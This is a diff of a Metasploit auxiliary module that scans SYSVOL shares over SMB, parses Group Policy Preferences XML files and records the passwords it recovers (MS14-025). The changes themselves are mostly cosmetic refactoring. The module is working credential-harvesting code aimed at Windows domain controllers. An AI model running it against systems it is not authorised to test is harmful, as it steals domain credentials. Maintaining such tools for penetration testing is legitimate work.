@@ -7,11 +7,7 @@ require 'msf/core'
 require 'rex/parser/group_policy_preferences'
 
 class Metasploit3 < Msf::Auxiliary
-  include Msf::Exploit::Remote::SMB
   include Msf::Exploit::Remote::SMB::Client::Authenticated
-  include Msf::Exploit::Remote::DCERPC
-
-  # Exploit mixins should be called first
   include Msf::Auxiliary::Scanner
   include Msf::Auxiliary::Report
 
@@ -35,18 +31,18 @@ class Metasploit3 < Msf::Auxiliary
         ],
       'References'    =>
         [
+          ['MSB', 'MS14-025'],
           ['URL', 'http://msdn.microsoft.com/en-us/library/cc232604(v=prot.13)'],
           ['URL', 'http://rewtdance.blogspot.com/2012/06/exploiting-windows-2008-group-policy.html'],
           ['URL', 'http://blogs.technet.com/grouppolicy/archive/2009/04/22/passwords-in-group-policy-preferences-updated.aspx'],
-          ['URL', 'https://labs.portcullis.co.uk/blog/are-you-considering-using-microsoft-group-policy-preferences-think-again/'],
-          ['MSB', 'MS14-025']
+          ['URL', 'https://labs.portcullis.co.uk/blog/are-you-considering-using-microsoft-group-policy-preferences-think-again/']
         ],
       'License'     => MSF_LICENSE
     )
     register_options([
       OptString.new('SMBSHARE', [true, 'The name of the share on the server', 'SYSVOL']),
       OptString.new('RPORT', [true, 'The Target port', 445]),
-      OptBool.new('STORE', [false, 'Store the enumerated files in loot.', true]),
+      OptBool.new('STORE', [true, 'Store the enumerated files in loot.', true])
     ], self.class)
   end
 
@@ -79,7 +75,7 @@ class Metasploit3 < Msf::Auxiliary
     end
   end
 
-  def report_creds(ip,user, password)
+  def report_creds(ip, user, password)
     service_data = {
       address: ip,
       port: rport,
@@ -88,7 +84,7 @@ class Metasploit3 < Msf::Auxiliary
       workspace_id: myworkspace_id
     }
 
-    new_user = user.sub(/\s+.*/,'')
+    new_user = user.sub(/\s+.*/, '')
     first, rest = new_user.split(/\\/)
     if first && rest
       domain = first
@@ -115,7 +111,6 @@ class Metasploit3 < Msf::Auxiliary
 
     login_data = {
       core: credential_core,
-      access_level: "User",
       status: Metasploit::Model::Login::Status::UNTRIED
     }
 
@@ -125,21 +120,22 @@ class Metasploit3 < Msf::Auxiliary
   def parse_xml(ip, path, xml_file)
     mxml = xml_file[:xml]
     print_status "Parsing file: \\\\#{ip}\\#{datastore['SMBSHARE']}\\#{path}"
-    filetype = File.basename(xml_file[:path].gsub("\\","/"))
+    file_type = File.basename(xml_file[:path].gsub("\\","/"))
     results = Rex::Parser::GPP.parse(mxml)
-    tables = Rex::Parser::GPP.create_tables(results, filetype, xml_file[:domain], xml_file[:dc])
+    tables = Rex::Parser::GPP.create_tables(results, file_type, xml_file[:domain], xml_file[:dc])
+
     tables.each do |table|
-      print_good table.to_s
+      print_good(table.to_s)
     end
+
     results.each do |result|
       if datastore['STORE']
-        stored_path = store_loot('windows.gpp.xml', 'text/plain',ip, xml_file[:xml], filetype, xml_file[:path])
+        stored_path = store_loot('windows.gpp.xml', 'text/plain', ip, xml_file[:xml], file_type, xml_file[:path])
         print_status("XML file saved to: #{stored_path}")
       end
 
       report_creds(ip, result[:USER], result[:PASS])
     end
-
   end
 
   def smb_download(ip, path)
@@ -151,15 +147,16 @@ class Metasploit3 < Msf::Auxiliary
 
     path_elements = path.split('\\')
     ret_obj = {
-      :dc     => ip,
-      :path   => path,
-      :xml    => data
+      :dc   => ip,
+      :path => path,
+      :xml  => data
     }
     ret_obj[:domain] = path_elements[0]
 
     parse_xml(ip, path, ret_obj) if ret_obj
 
     fname = path.split("\\")[-1]
+
     if datastore['STORE']
       path = store_loot('smb.shares.file', 'application/octet-stream', ip, data, fname)
       print_good("#{fname} saved as: #{path}")
